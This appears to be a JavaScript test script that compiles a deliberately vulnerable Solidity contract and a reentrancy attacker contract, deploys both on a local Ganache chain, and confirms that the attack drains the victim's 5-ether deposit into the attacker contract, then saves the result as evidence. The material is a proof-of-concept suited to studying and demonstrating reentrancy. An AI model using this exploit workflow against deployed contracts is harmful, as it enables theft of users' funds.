import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import ganache from "ganache";
import solc from "solc-0.4";
import { BrowserProvider, ContractFactory, parseEther } from "ethers";

const root = path.resolve(import.meta.dirname, "..");
const sourceNames = ["Dangerous.sol", "ReentrancyAttacker.sol"];
const sources = Object.fromEntries(
  sourceNames.map((name) => [name, { content: fs.readFileSync(path.join(root, "contracts", name), "utf8") }]),
);
const input = {
  language: "Solidity",
  sources,
  settings: {
    optimizer: { enabled: true, runs: 200 },
    outputSelection: { "*": { "*": ["abi", "evm.bytecode.object"] } },
  },
};
const output = JSON.parse(solc.compileStandardWrapper(JSON.stringify(input)));
const errors = (output.errors || []).filter((entry) => entry.severity === "error");
assert.equal(errors.length, 0, errors.map((entry) => entry.formattedMessage).join("\n"));

const rpc = ganache.provider({ logging: { quiet: true }, wallet: { totalAccounts: 4 } });
const provider = new BrowserProvider(rpc);
const owner = await provider.getSigner(0);
const victim = await provider.getSigner(1);

async function deploy(file, name, signer, args = []) {
  const artifact = output.contracts[file][name];
  const factory = new ContractFactory(artifact.abi, `0x${artifact.evm.bytecode.object}`, signer);
  const contract = await factory.deploy(...args);
  await contract.waitForDeployment();
  return contract;
}

const dangerous = await deploy("Dangerous.sol", "Dangerous", owner);
await (await dangerous.connect(victim).depositMoney({ value: parseEther("5") })).wait();
const attacker = await deploy(
  "ReentrancyAttacker.sol",
  "ReentrancyAttacker",
  owner,
  [await dangerous.getAddress()],
);
const receipt = await (await attacker.attack({ value: parseEther("1") })).wait();

const dangerousBalance = await provider.getBalance(await dangerous.getAddress());
const attackerBalance = await provider.getBalance(await attacker.getAddress());
assert.equal(dangerousBalance, 0n);
assert.equal(attackerBalance, parseEther("6"));

const evidence = {
  compiler: solc.version(),
  optimizer: { enabled: true, runs: 200 },
  initialVictimDepositWei: parseEther("5").toString(),
  attackerDepositWei: parseEther("1").toString(),
  targetBalanceAfterAttackWei: dangerousBalance.toString(),
  attackerContractBalanceAfterAttackWei: attackerBalance.toString(),
  attackTransactionGasUsed: receipt.gasUsed.toString(),
  scope: "Local Ganache chain only",
};
fs.mkdirSync(path.join(root, "evidence"), { recursive: true });
fs.writeFileSync(path.join(root, "evidence", "local-reentrancy-test.json"), `${JSON.stringify(evidence, null, 2)}\n`);
console.log(JSON.stringify(evidence, null, 2));
rpc.disconnect();
